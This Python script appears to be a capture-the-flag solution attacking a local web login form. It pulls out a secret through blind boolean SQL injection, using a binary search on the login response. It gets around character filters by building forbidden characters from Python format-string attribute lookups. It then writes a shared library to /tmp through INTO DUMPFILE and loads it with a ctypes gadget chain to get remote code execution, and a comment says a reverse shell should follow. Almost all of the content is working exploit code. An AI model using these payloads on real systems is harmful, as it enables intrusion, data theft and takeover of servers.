import requests

ENDPOINT_URL = "http://localhost:5000/"
CONDITION_TEMPLATE = "' OR {condition};-- -"
SESSION = requests.Session()

TRANSLATIONS = {
    "'": ("{password.__doc__[11]}", ""),
    " ": ("{password.__doc__[14]}", ""),
    "(": ("{password.__doc__[3]}", ""),
    ")": ("{password.__doc__[13]}", ""),
    "-": ("{password.__doc__[15]}", ""),
    ",": ("{password.__doc__[42]}", ""),
    ";": ("{semicolon.__init__.__globals__[re].sub.__doc__[181]}", "{semicolon}"),
    "/": ("{slash.__init__.__globals__[re].__doc__[2223]}", "{slash}")
}

def encode(payload):
    result = []
    appended_chars = set()
    last_replacement_index = -1

    for c in payload:
        if c in TRANSLATIONS:
            subst, append = TRANSLATIONS[c]
            result.append(subst)
            last_replacement_index = len(result)
            if append and append not in appended_chars:
                appended_chars.add(append)
        else:
            result.append(c)
    
    if appended_chars and last_replacement_index != -1:
        appender_string = "".join(appended_chars)
        result = result[:last_replacement_index] + [appender_string] + result[last_replacement_index:]
    
    return "".join(result)

def send_payload(payload):
    data = {
        "username": payload,
        "password": "skibiditoilet"
    }
    response = SESSION.post(ENDPOINT_URL, data=data)
    return response.text

def is_truthy(payload):
    response = send_payload(payload)
    return "Login successful!" in response

def get_flag_length():
    low, high = 1, 100  # Adjust the upper bound if necessary
    while low <= high:
        mid = (low + high) // 2
        condition = f"LENGTH((SELECT flag FROM flags)) >= {mid}"
        payload = encode(CONDITION_TEMPLATE.format(condition=condition))
        if is_truthy(payload):
            low = mid + 1
        else:
            high = mid - 1
    return high

def get_flag_char_at_pos(position):
    low, high = 32, 126  # Printable ASCII range
    while low <= high:
        mid = (low + high) // 2
        condition = f"ASCII(SUBSTRING((SELECT flag FROM flags),{position},1)) >= {mid}"
        payload = encode(CONDITION_TEMPLATE.format(condition=condition))
        if is_truthy(payload):
            low = mid + 1
        else:
            high = mid - 1
    return chr(high)

def solve_flag1():
    flag_length = get_flag_length()
    print(f"Flag length: {flag_length}")
    flag = ''.join(get_flag_char_at_pos(i) for i in range(1, flag_length + 1))
    return flag

def hex_encode_file(file_path):
    with open(file_path, "rb") as f:
        content = f.read()
    return content.hex()

def solve_flag2():

    FILE_WRITE_PAYLOAD = (encode("' UNION SELECT CAST(UNHEX('{{CONTENTS}}') AS BINARY), null, null INTO DUMPFILE '/tmp/exploit';-- -")).replace("{{CONTENTS}}", hex_encode_file("./exploit.so"))
    send_payload(FILE_WRITE_PAYLOAD)
    RCE_PAYLOAD = encode("{{a.__init__.__globals__[re].__loader__.load_module.__globals__[sys].modules[ctypes].cdll[/tmp/exploit]}}{{a}}")
    send_payload(RCE_PAYLOAD)
    # should get a rev shell now
    

def main():
    flag1 = solve_flag1()
    print(f"Flag: {flag1}")
    solve_flag2()


if __name__ == "__main__":
    main()